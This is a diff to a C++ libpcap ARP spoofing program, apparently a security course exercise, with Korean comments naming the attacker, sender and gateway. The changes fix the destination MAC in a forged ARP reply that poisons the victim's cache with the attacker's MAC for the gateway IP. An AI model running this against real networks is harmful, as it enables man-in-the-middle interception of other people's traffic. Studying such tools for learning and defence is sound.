@@ -29,8 +29,8 @@ int main(int argc, char* argv[]) {
     myIp(my_Ip, argv[1]);
 
     printf("mymac:%s\n",mac_adr);
-    printf("1:%s\n",argv[2]);
-    printf("2:%s\n",argv[3]);
+    printf("sIP:%s\n",argv[2]);
+    printf("tIP:%s\n",argv[3]);
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
     char errbuf_rq[PCAP_ERRBUF_SIZE];
@@ -101,7 +101,7 @@ int main(int argc, char* argv[]) {
        printf("senderMac : %s\n",senderMac);
 
 
-    packet.eth_.dmac_ = Mac(smac_adr); //Sender의 mac 주소
+    packet.eth_.dmac_ = Mac(senderMac); //Sender의 mac 주소
     packet.eth_.smac_ = Mac(mac_adr); //Attacker의 mac 주소
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -111,7 +111,7 @@ int main(int argc, char* argv[]) {
     packet.arp_.op_ = htons(ArpHdr::Reply);// 02
     packet.arp_.smac_ = Mac(mac_adr);//Attacker의 mac주소
     packet.arp_.sip_ = htonl(Ip(argv[3])); //gateway(target)의 ip주소
-    packet.arp_.tmac_ = Mac(smac_adr); //sender의 mac주소
+    packet.arp_.tmac_ = Mac(senderMac); //sender의 mac주소
     packet.arp_.tip_ = htonl(Ip(argv[2])); //sender의 ip주소
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
